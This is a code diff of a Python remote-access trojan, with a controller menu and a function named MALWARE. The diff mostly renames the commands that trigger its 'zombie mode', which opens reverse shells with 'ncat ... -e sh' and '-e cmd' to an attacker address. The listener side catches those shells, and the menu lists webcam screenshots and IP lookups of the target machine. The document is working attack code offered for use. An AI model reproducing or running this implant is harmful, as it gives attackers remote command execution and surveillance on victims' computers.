@@ -61,8 +61,8 @@ EMPEROR_MENU_BANNER = ("""
 LISTENER_MENU_BANNER = ("""
  \033[97;1m╔═══[COMMAND]══════[DESCRIPTION]══════════════════════════════════════════════════════╗\033[0m
  \033[97;1m║>>>\033[0m \033[91mhelp\033[0m           \033[97;1mDisplay all [listener] tool commands                              ║\033[0m
- \033[97;1m║>>>\033[0m \033[91mzombie -linux\033[0m  \033[97;1mStart zombie mode on the target machine Linux                     ║\033[0m
- \033[97;1m║>>>\033[0m \033[91mzombie -windows\033[0m\033[97;1mStart zombie mode on the target machine Windows                   ║\033[0m
+ \033[97;1m║>>>\033[0m \033[91mzombie -l\033[0m      \033[97;1mStart zombie mode on the target machine Linux                     ║\033[0m
+ \033[97;1m║>>>\033[0m \033[91mzombie -w\033[0m      \033[97;1mStart zombie mode on the target machine Windows                   ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mipinfo\033[0m         \033[97;1mObtain all the IP address information of the target machine       ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mscreenshot\033[0m     \033[97;1mObtain the screenshot of the target machine webcam                ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mreset\033[0m          \033[97;1mReset the [listener] tool                                         ║\033[0m
@@ -97,7 +97,7 @@ import subprocess
 
 
 def MALWARE():
-    LHOST = "192.168.1.26"
+    LHOST = "127.0.0.1"
     LPORT = 833
 
     SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -106,10 +106,10 @@ def MALWARE():
     while True:
         MALWARE_RECV = SOCKET.recv(8000).decode()
         
-        if MALWARE_RECV == "zombie -linux":
+        if MALWARE_RECV == "zombie -l":
            os.system("ncat 192.168.1.26 834 -e sh")
            
-        if MALWARE_RECV == "zombie -windows":
+        if MALWARE_RECV == "zombie -w":
            os.system("ncat 192.168.1.26 835 -e cmd")
         
         if MALWARE_RECV == "ipinfo":
@@ -190,16 +190,16 @@ def LISTENER():
            time.sleep(10)
            LISTENER() 
            
-        if LISTENER_INPUT == "zombie -linux":
+        if LISTENER_INPUT == "zombie -l":
            print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting zombie mode on the target machine Linux...\033[0m")
            time.sleep(2)
-           CONN.send("zombie -linux".encode())
+           CONN.send("zombie -l".encode())
            os.system("ncat -lvnp 834")
            
-        if LISTENER_INPUT == "zombie -windows":
+        if LISTENER_INPUT == "zombie -w":
            print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting zombie mode on the target machine Windows...\033[0m")
            time.sleep(2)
-           CONN.send("zombie -windows".encode())
+           CONN.send("zombie -w".encode())
            os.system("ncat -lvnp 835")
            
         if LISTENER_INPUT == "ipinfo":
